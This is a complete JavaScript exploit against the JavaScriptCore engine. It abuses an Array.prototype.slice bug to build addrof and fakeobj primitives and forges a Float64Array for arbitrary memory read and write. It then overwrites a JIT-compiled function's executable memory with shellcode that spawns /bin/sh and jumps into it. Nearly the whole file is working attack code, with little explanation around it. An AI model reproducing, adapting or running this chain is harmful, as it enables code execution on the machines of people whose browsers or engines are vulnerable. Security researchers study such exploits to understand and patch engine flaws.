load('utils.js');
load('int64.js');

function addrof(object) {
    var a = [];
    for (var i = 0; i < 100; i++)
        a.push(i + 0.123)
    var b = a.slice(0, {valueOf: function() { a.length = 0; b = [object]; return 10; }});
    // Find offset 4 at runtime
    return Int64.fromDouble(b[4]);
}

function fakeobj(addr) {
    var a = []
    for (var i = 0; i < 100; i++)
        a.push({})
    var b = a.slice(0, {valueOf: function() { a.length = 0; b = [addr.asDouble()]; return 10; }});
    return b[4];
}

foo = [];
for (var i = 0; i < 100; i++)
    foo.push(i+0.123)


var structs = [];
function sprayFloat64ArrayStructures() {
    for (var i = 0; i < 0x1000; i++) {
        var a = new Float64Array(1);
        prop = "foo" + i		// Need a unique property to get a new structure id
        a[prop] = 1337;
        structs.push(a);
    }
}

sprayFloat64ArrayStructures();

// Target to overwrite the vector (data-ptr)
var hax = new Uint8Array(1000);

print("[*] hax @ " + addrof(hax));
var jsCellHeader = new Int64([
	0x0, 0x10, 0x0, 0x0,	// m_structureID, current guess
	0x0, 					// m_indexingType
	0x2c,					// m_type, Float64Array
	0x08,					// m_flags, OverridesGetOwnPropertySlot (see JSTypeInfo.h)
	0x1,					// m_cellState, NewWhite
]);


var container = {
	jsCellHeader: jsCellHeader.asJSValue(),
	butterfly: false, 		// Invalid value, but we can't write 0x0 here
	vector: hax,
	lengthAndFlags: (new Int64('0x0001000000000100')).asJSValue() // Needs to be a valid JSValue and large enough for our write
};

// Create the fake Float64Array.
var address = Add(addrof(container), 16);
print("[*] Fake Float64Array  @ " + address);
var fakearray = fakeobj(address);


while (!(fakearray instanceof Float64Array)) {
	jsCellHeader.assignAdd(jsCellHeader, Int64.One);
	container.jsCellHeader = jsCellHeader.asJSValue();
}

print("[*] Float64Array structure ID found: " + jsCellHeader.toString().substr(-8));

memory = {
	read: function(addr, length) {
		print("[<] Reading " + length + " bytes from " + addr);
        fakearray[2] = addr.asDouble();
        var res = new Array(length);
        for (var i=0; i < length; i++)
            res[i] = hax[i];
        return res;
    },
    read64: function(addr) {
        return new Int64(this.read(addr, 8));
    },
    write: function(addr, data) { print("[>] Writing " + data.length + " bytes to " + addr);
        fakearray[2] = addr.asDouble();
        for (var i=0; i < data.length; i++)
            hax[i] = data[i];
    },
    write64: function(value) {
        return this.write(addr, value.bytes());
    }
};
print("[+] Cleaning up!");
var empty = {};
var header = memory.read(addrof(empty), 8);
memory.write(addrof(container), header);

var f64array = new Float64Array(8);
header = memory.read(addrof(f64array), 16);
var length = memory.read(Add(addrof(f64array), 24), 8);

memory.write(addrof(fakearray), header);
memory.write(Add(addrof(fakearray), 24), length);


print("[+] All done!");

fakearray.container = container;

//Create JIT-Code-Object
function makeJITCompiledFunction() {
	function target(x) {
		return x;
	}
	for (var i = 0; i < 1000; i++) {
		target(i);
	}
	return target;
}

var func = makeJITCompiledFunction();
//JSFunction
var funcAddr = addrof(func);
print("[+] JIT compiled function @ " + funcAddr);

//FunctionExecutable
var executableAddr = memory.read64(Add(funcAddr, 24));
print("[+] Executable instance @ " + executableAddr);

//JITCode
// Need to leak twice (value chages)
var jitCodeAddr = memory.read64(Add(executableAddr, 24));
print("[+] First try; JITCode instance @ " + jitCodeAddr); // need this print (probably some gc thing)
var jitCodeAddr = memory.read64(Add(executableAddr, 24));
print("[+] Second try; JITCode instance @ " + jitCodeAddr);

var codeAddr = memory.read64(Add(jitCodeAddr, 32));
print("[+] RWX memory @ " + codeAddr.toString());

var shellcode = [0x48,0x31,0xc0,0x50,0x48,0xbf,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x57,0x48,0x89,0xe7,0x50,0x48,0x89,0xe2,0x57,0x48,0x89,0xe6,0xb0,0x3b,0x0f,0x05]

print("[+] Writing shellcode...");
memory.write(codeAddr, shellcode);

print("[!] Jumping into shellcode...");
func();


